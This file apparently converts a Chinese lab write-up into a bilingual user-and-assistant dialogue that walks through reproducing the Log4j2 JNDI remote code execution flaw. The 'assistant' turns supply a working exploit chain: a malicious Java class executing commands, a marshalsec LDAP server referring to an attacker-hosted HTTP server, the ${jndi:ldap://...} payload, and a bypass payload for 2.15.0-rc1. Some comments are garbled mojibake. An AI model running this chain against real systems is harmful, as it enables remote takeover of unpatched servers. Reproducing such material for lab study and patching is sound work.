@@ -1,0 +1,154 @@
+{
+    "_source_md":  "Apache-Log4j2/2021-12-15-Apache-Log4j2-RCE-WalkThrough.md",
+    "version":  "log4j2-rce-walkthrough",
+    "title":  {
+                  "zh":  "Apache Log4j2 远程代码执行复现：从基础到绕过",
+                  "en":  "Apache Log4j2 Remote Code Execution Walkthrough: From Basics to Bypass"
+              },
+    "description":  {
+                        "zh":  "详细介绍 Apache Log4j2 远程代码执行漏洞的复现过程，包括环境准备、payload 构造、LDAP/RMI 服务搭建，以及 2.15.0-rc1 版本的绕过方法。",
+                        "en":  "Detailed walkthrough of Apache Log4j2 remote code execution vulnerability reproduction, including environment preparation, payload construction, LDAP/RMI service setup, and bypass methods for version 2.15.0-rc1."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何复现 Log4j2 RCE 漏洞？",
+                                      "en":  "How to reproduce Log4j2 RCE vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求漏洞复现指导",
+                                         "en":  "User requests vulnerability reproduction guidance"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003e java -version\njava version \"1.8.0_181\"\nJava(TM) SE Runtime Environment (build 1.8.0_181-b13)\nJava HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "// com.example.log4j2_rce.Log4j2RceApplication\n@PostMapping({\"/hello\"})\npublic String hello(String payload) {\n  System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n  System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\");\n  logger.error(\"{}\", payload);\n  logger.info(\"{}\", payload);\n  logger.info(payload);\n  logger.error(payload);\n  return \"ok\";\n}",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# 鍚痺eb\n$ java -jar demo.jar\n  .   ____          _            __ _ _\n /\\\\ / ___\u0027_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | \u0027_ | \u0027_| | \u0027_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  \u0027  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::        (v2.1.3.RELEASE)",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "// $ cat dnslog.java\nimport java.lang.Runtime;\nimport java.lang.Process;\n\npublic class dnslog {\n\tstatic {\n\t\ttry{\n\t \tRuntime rt = Runtime.getRuntime();\n\t \tString[] commands = {\"open\",\"/System/Applications/Calculator.app\"};\n\t \tProcess pc = rt.exec(commands);\n\t \tpc.waitFor();\n\t \t}catch (Exception e) {\n\t \t//no\n\t\t}\n\t}\n}\n// $ javac dnslog.java",
+                                             "language":  "java"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# 鍚疞DAP鏈嶅姟锛?$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://192.168.3.64/#dnslog\"",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "# 鍚痟ttp锛?$ python3 -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cdependency\u003e\n  \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e\n  \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e\n  \u003c!--\u003cversion\u003e2.14.1\u003c/version\u003e--\u003e\n  \u003cversion\u003e2.15.0-rc1\u003c/version\u003e\n\u003c/dependency\u003e\n        \u003c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --\u003e\n\u003cdependency\u003e\n\u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e\n\u003cartifactId\u003elog4j-api\u003c/artifactId\u003e\n\u003c!--\u003cversion\u003e2.14.1\u003c/version\u003e--\u003e\n\u003cversion\u003e2.15.0-rc1\u003c/version\u003e\n\u003c/dependency\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\n\u003cconfiguration status=\"OFF\" monitorInterval=\"30\"\u003e\n  \u003cappenders\u003e\n    \u003cconsole name=\"Console\" target=\"SYSTEM_OUT\"\u003e\n      \u003cPatternLayout pattern=\"%m{lookups}%n\"/\u003e\n    \u003c/console\u003e\n  \u003c/appenders\u003e\n\n  \u003cloggers\u003e\n    \u003croot level=\"all\"\u003e\n      \u003cappender-ref ref=\"Console\"/\u003e\n    \u003c/root\u003e\n  \u003c/loggers\u003e\n\u003c/configuration\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "logger.error(\"hello,error\");\nlogger.info(\"hello,info\");\nlogger.debug(\"hello,debug\");\n#杈撳嚭濡備笅锛?hello,error\nhello,info\nhello,debug\n\nProcess finished with exit code 0",
+                                             "language":  "bash"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "复现环境准备：1) 准备 demo.jar 或 idea 代码调试环境；2) JDK 版本需低于 11，推荐 1.8.0_181；3) 受影响版本：Log4j 2.x \u003c= 2.15.0-rc1。使用 JD-GUI 反编译 demo.jar，分析代码发现 /hello 路由接收 payload 参数并使用 logger.error 记录。",
+                                      "en":  "Reproduction environment preparation: 1) Prepare demo.jar or idea code debugging environment; 2) JDK version needs to be below 11, recommend 1.8.0_181; 3) Affected versions: Log4j 2.x \u003c= 2.15.0-rc1. Use JD-GUI to decompile demo.jar, analyze code to find /hello route receives payload parameter and uses logger.error to record."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何构造攻击 payload？",
+                                      "en":  "How to construct attack payload?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "Payload 构造流程：1) 编写恶意 Java 类 dnslog.java，使用 Runtime.exec 执行命令；2) 编译生成 dnslog.class；3) 启动 HTTP 服务提供恶意类下载：python3 -m http.server 80；4) 启动 LDAP 服务：java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://192.168.3.64/#dnslog\"；5) 发送 payload：${jndi:ldap://192.168.3.64:1389/dnslog}。",
+                                      "en":  "Payload construction process: 1) Write malicious Java class dnslog.java, use Runtime.exec to execute commands; 2) Compile to generate dnslog.class; 3) Start HTTP service to provide malicious class download: python3 -m http.server 80; 4) Start LDAP service: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://192.168.3.64/#dnslog\"; 5) Send payload: ${jndi:ldap://192.168.3.64:1389/dnslog}."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "2.15.0-rc1 版本如何绕过？",
+                                      "en":  "How to bypass version 2.15.0-rc1?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "2.15.0-rc1 绕过方法：修改 pom.xml 将版本改为 2.15.0-rc1，添加 log4j2.xml 配置文件，设置 PatternLayout pattern 为 %m{lookups}%n 开启 lookup 功能。绕过 payload：${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}，通过域名解析绕过限制。限制：高版本 JDK 会报错 Reference Class Name: foo。",
+                                      "en":  "2.15.0-rc1 bypass method: Modify pom.xml to change version to 2.15.0-rc1, add log4j2.xml configuration file, set PatternLayout pattern to %m{lookups}%n to enable lookup function. Bypass payload: ${jndi:ldap://127.0.0.1#.4ra1n.love:1389/badClassName}, bypass restrictions through domain name resolution. Limitation: High version JDK will report error Reference Class Name: foo."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
